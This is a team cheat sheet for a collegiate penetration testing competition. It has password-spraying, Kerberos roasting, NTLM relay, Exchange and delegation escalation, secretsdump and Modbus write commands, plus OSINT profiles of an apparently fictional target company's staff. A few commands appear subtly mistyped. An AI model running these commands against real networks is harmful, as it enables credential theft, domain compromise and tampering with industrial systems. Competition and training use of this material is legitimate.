# 2020 Collegiate Penetration Testing Competition Packet

## Google Drive Structure
* `<name>/` - misc notes
    * `logs/` - from `~/logs`
    * `screenshots/`
* `scans/` - files each with one scan output
* `lists/` - username and password lists

## VDI Setup

### Windows VDI
Recommended software to install:
* Bitvise SSH client - https://bitvise.com/ssh-client-download
* Wireshark - https://www.wireshark.org/download.html
* Greenshot (screenshot) - https://getgreenshot.org/downloads/

### Linux VDI
Use Bitvise from Windows VDI to SSH to Linux VDI. On first login, do this to enable logging:
```sh
mkdir ~/logs
echo "script ~/logs/\$(date +%s).log" >> .bash_profile
```
Optional Windows AD tools:
```sh
git clone https://github.com/fox-it/mitm6.git
cd mitm6
sudo pip install .
```
```sh
git clone https://github.com/SecureAuthCorp/impacket
cd impacket
sudo pip install .
```

## Scripts

### Password List
Type into file `old.txt`:
```
august
september
october
summer
fall
winter
corona
covid19
ngpw
ngpew
power
electricity
water
smallville
StrongPassword1
WestThompsonDam
OrchardStreetDam
Mustangs
TullyDam
```
Run this Python script (comments not needed):
```python
# Read the original passwords
with open("old.txt", "r") as f:
	o = list(filter(None, f.read().split("\n")))

# Add years
for x in o[:]:
	if not x[0].isdigit():
		o.append(x + "20")
		o.append(x + "2020")
		o.append(x + "1")

# Add capitals
for x in o[:]:
	if x[0].islower():
		o.append(x.capitalize())

# Add special characters
for x in o[:]:
	o.append(x + "!")
	o.append(x + "?")

# Write to file
with open("new.txt", "w") as f:
	f.write("\n".join(o))
```
Add `new.txt` to `lists/` in the Google Drive.

## Reconnaissance
Initial scan (add to new Google Drive file in `scans/`):
```sh
nmap <ip_range> -T5 -F -oN scan_short
```
Much longer scan (add to a new Google Drive file in `scans/`):
```sh
nmap <ip_range> -T5 -p- -A -oN scan_long
```
Dump traffic (use Bitvise on Windows to retrieve the PCAP and open it in Wireshark):
```
ifconfig # find name of interface
tcpdump -i <interface> -s 65535 -w dump.pcap
```

## Web
Find pages:
```sh
dirb <url_base>
```
Scan for vulnerabilities:
```sh
nikto -h <ip> -p <port> # can also pass file with list of IPs
```

## Windows AD
More resources at https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md.

### Initial access
Spray passwords on SMB (careful locking accounts):
```sh
crackmapexec smb <ip> -u <username_list> -p <password_list> --continue-on-success
```
Spray passwords on Kerberos (https://github.com/ropnop/kerbrute/tags) (careful locking accounts):
```sh
./kerbrute userenum -d <domain_name> <username_list>
./kerbrute passwordspray -d <domain_name> <username_list> <password>
./kerbrute bruteuser -d <domain_name> username <password_list>
```
ASREPRoast (can also be done via Rubeus on Windows):
```sh
crackmapexec ldap <ip> -u <username_list> -p '' --asreproast output.txt\
hashcat -m18200 output.txt <password_list>
```
May get NTLMv2 hash:
```sh
responder -I <interface> --wpad
```
May get a shell (need mitm6 and impacket):
```sh
mitm6 -i <interface> -d <domain_name>
ntlmrelayx.py -wh <your_ip> -t smb://<ip> -i # in new terminal
```

### Escalation
Kerberoasting (need domain account):
```sh
crackmapexec ldap <ip> -u <username> -p <password> --kerberoasting output.txt
hashcat -m13100 output.txt <password_list>
```
Same thing with impacket:
```sh
GetUserSPNs.py -request -dc-ip <ip> <domain_name>/<username>
```
Microsoft Exchange escalation (need impacket):
```sh
wget https://raw.githubusercontent.com/dirkjanm/PrivExchange/master/privexchange.py
ntlmrelayx.py -t ldap://<ip> --escalate-user <username>
python privexchange.py -ah <your_ip> <hostname>.<domain_name> -u <username> -d <domain_name> -p <password> # in new terminal
secretsdump.py <domain_name>/<username><hostname>.<domain_name> -just-dc # in new terminal
```
Resource-based constrained delegation (need mitm6 and impacket):
```sh
mitm6 -i <interface> -d <domain_name>
ntlmrelayx.py -t ldaps://<hostname>.<domain_name> -wh <your_ip> --delegate-access # in new terminal
gtST.py -spn cifs/<hostname>.<domain_name>/<new_username>\$ -dc-ip <ip> -impersonate Administrator # in new terminal
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass <hostname>.<domain_name>
```

## SCADA
Good summary: https://github.com/nationalcptc-teamtools/University-of-Southern-California/blob/main/misc/scada.txt.

### Modbus
Sniff traffic via `tcpdump` or Wireshark to understand the traffic. Pentration testing framework: https://github.com/theralfbrown/smod-1. Metasploit has a client:
```
use auxiliary/scanner/scada/modbusclient
show actions
set action <action_name>
show options
run
```
PyModbus (`pip install pymodbus`) can be used to read and write to registers:
```python
from pymodbus.client.sync import ModbusTcpClient
client = ModbusTcpClient("127.0.0.1")
client.write_coil(1, True)
result = client.read_coils(1, 1)
print(result.bits[0])
client.close()
# https://pymodbus.readthedocs.io/en/latest/source/library/pymodbus.client.html
```

## OSINT

### Password Policy
* More than 3 or 4 characters
* Less than 20 characters

### Company
* Headquarted in Smallville, NY 14773
* 51-200 employees
* Founded in 1980

### People
* Grace Grantham
    * Position: Chief Executive Officer since August 2019
    * Location: Salamanca, NY
    * Education: Western Governors University MBA (2004-2007), Humboldt State University Bachelor's in Environmental Science (2003-2007)
    * Founder/CEO of H2Mon (June 2009-March 2019) in Bay Area
    * Likes Melinda Gates
* King Shields
    * Position: Chief Operating Officer since December 2001
    * Location: Buffalo-Niagara Falls Area
    * Education: Cornell University MEng/MBA (2009-2012), University of Pennsylvania Bachelor’s in Hydrology/EE (1993-1998)
    * At NGPEW for 20+ years, in management for 10+ years
* Tiny Glover
    * Position: Chief Engineering Officer
    * Location: Portland, OR
    * Enjoys golf, averages a 98
* Gaylord Schaefer
    * Position: Director of Information Technology since May 1996
    * Location: Salamanca, NY
    * Education: University of Montevallo BS in Art (1987-1993)
    * Skilled in Windows 95/98
* Maxie Thompson
    * Position: Director of Safety
* Barbara Leuschke
    * Position: Director of Human Resources since July 2017
    * Location: Buffalo-Niagara Falls Area
    * Education: Barnard College Master’s in Industrial/Organizational Psychology (2012-2014), University of Michigan Bachelor’s in HR Management/Services (2008-2012)